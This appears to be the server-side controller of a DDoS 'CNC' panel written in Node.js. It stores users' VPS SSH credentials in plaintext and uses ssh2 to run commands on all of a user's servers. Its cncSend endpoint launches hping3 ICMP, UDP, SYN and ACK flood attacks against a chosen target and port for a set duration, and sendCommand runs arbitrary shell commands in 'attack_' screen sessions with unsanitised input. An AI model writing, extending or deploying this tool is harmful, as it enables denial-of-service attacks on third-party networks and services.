const { sesionKey } = require('./tgtools.js');
const { exec } = require('child_process');
const fs = require("fs");
const path = require("path");
const VPS_PATH = path.join(__dirname, '../database/vps.json');

function loadVpsList() {
  try {
    if (!fs.existsSync(VPS_PATH)) {
      fs.writeFileSync(VPS_PATH, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(VPS_PATH));
  } catch (err) {
   console.log(err);
    return [];
  }
}

function saveVpsList(data) {
  try {
    fs.writeFileSync(VPS_PATH, JSON.stringify(data, null, 2));
    return true;
  } catch (err) {
    return false;
  }
}

class VPSController {
  static async getMyServer(req, res) {
    const { key } = req.query;
    const keyInfo = sesionKey[key];
    if (!keyInfo) {
      return res.status(401).json({ error: "Invalid session key" });
    }
    const userVPS = loadVpsList().filter(vps => vps.owner === keyInfo.username);    
    return res.json({ servers: userVPS });
  }

  static async addServer(req, res) {
    const { key, host, username: sshUser, password } = req.body;

    const keyInfo = sesionKey[key];
    if (!keyInfo) {
      return res.status(401).json({ error: "Invalid session key" });
    }

    if (!host || !sshUser || !password) {
      return res.status(400).json({ error: "Missing fields" });
    }

    const vpsList = loadVpsList();
    const newVPS = { host, username: sshUser, password, owner: keyInfo.username };
    vpsList.push(newVPS);
    saveVpsList(vpsList);

    return res.json({ success: true, message: "VPS added" });
  }

  static async deleteServer(req, res) {
    const { key, host } = req.body;

    const keyInfo = sesionKey[key];
    if (!keyInfo) {
      return res.status(401).json({ error: "Invalid session key" });
    }

    let vpsList = loadVpsList();
    const before = vpsList.length;
    vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === keyInfo.username));
    saveVpsList(vpsList);

    const deleted = before !== vpsList.length;

    return res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
  }

  static async sendCommand(req, res) {
    const { key, command } = req.body;

    const keyInfo = sesionKey[key];
    if (!keyInfo) {
      return res.status(401).json({ error: "Invalid session key" });
    }

    const userVPS = loadVpsList().filter(vps => vps.owner === keyInfo.username);
    if (userVPS.length === 0) {
      return res.status(400).json({ error: "No VPS available for this user" });
    }

    let successCount = 0;
    const results = [];

    try {
      for (const vps of userVPS) {
        const screenCommand = `screen -dmS attack_${Date.now()}_${Math.random().toString(36).substring(7)} bash -c "${command}"`;
        
        const { Client } = require('ssh2');
        const conn = new Client();
        
        conn.on('ready', () => {
          conn.exec(screenCommand, (err, stream) => {
            if (err) {
              results.push({ host: vps.host, success: false, error: err.message });
            } else {
              successCount++;
              results.push({ host: vps.host, success: true });
            }
            stream.end();
            conn.end();
          });
        }).connect({
          host: vps.host,
          port: 22,
          username: vps.username,
          password: vps.password
        });
        
        successCount++;
        results.push({ host: vps.host, success: true });
      }
      
      return res.json({ success: true, message: `Command sent to ${successCount} VPS`, results });
    } catch (err) {
      return res.status(500).json({ error: "Failed to send command" });
    }
  }

  static async cncSend(req, res) {
    const { key, target, port, duration, ddos } = req.query;

    const keyInfo = sesionKey[key];
    if (!keyInfo) {
      return res.status(401).json({ error: "Invalid session key" });
    }
    const owner = keyInfo.username;

    if (!target || !port || !duration) {
      return res.status(400).json({ error: "Missing fields" });
    }

    const userVPS = loadVpsList().filter(vps => vps.owner === owner);
    if (userVPS.length === 0) {
      return res.status(400).json({ error: "No VPS available for this user" });
    }

    let successCount = 0;
    const results = [];
    for (const vps of userVPS) {
      let command = "";
      const killCmd = `sleep ${duration}; pkill screen`;
      if (ddos === "icmp") {
        command = `hping3 --icmp --flood ${target} --data 65495`;
      } else if (ddos === "udp") {
        command = `hping3 --udp --flood ${target} -p ${port}`;
      } else if (ddos === "s-pps") {
        command = `hping3 -S --flood ${target} -p ${port}`;
      } else if (ddos === "a-pps") {
        command = `hping3 -A --flood ${target} -p ${port}`;
      } else if (ddos === "s-gbps") {
        command = `hping3 -S --flood ${target} -p ${port} --data 65495`;
      } else if (ddos === "a-gbps") {
        command = `hping3 -A --flood ${target} -p ${port} --data 65495`;
      } else {
        results.push({ host: vps.host, success: false, error: "Invalid DDOS type" });
        continue;
      }
      const screenCommand = `screen -dmS permen_session_${Date.now()} bash -c '${command}'`;
      const screenKillCommand = `screen -dmS permen_session_${Date.now()} bash -c '${killCmd}'`;        
        const { Client } = require('ssh2');
        const conn = new Client();        
        conn.on('ready', () => {
          conn.exec(screenCommand, (err, stream) => {
            if (err) {
              results.push({ host: vps.host, success: false, error: err.message });
            } else {
              successCount++;
              results.push({ host: vps.host, success: true });
            }
            stream.end();
            conn.end();
          });
          conn.exec(screenKillCommand, (err, stream) => {
            if (err) {
              results.push({ host: vps.host, success: false, error: err.message });
            } else {
              successCount++;
              results.push({ host: vps.host, success: true });
            }
            stream.end();
            conn.end();
          });
        }).connect({
          host: vps.host,
          port: 22,
          username: vps.username,
          password: vps.password
        });        
      successCount++;
      results.push({ host: vps.host, success: true });
    }
    return res.json({ 
      success: true, 
      message: `Command sent to ${successCount} VPS`,
      results 
    });
  }
}
module.exports = VPSController;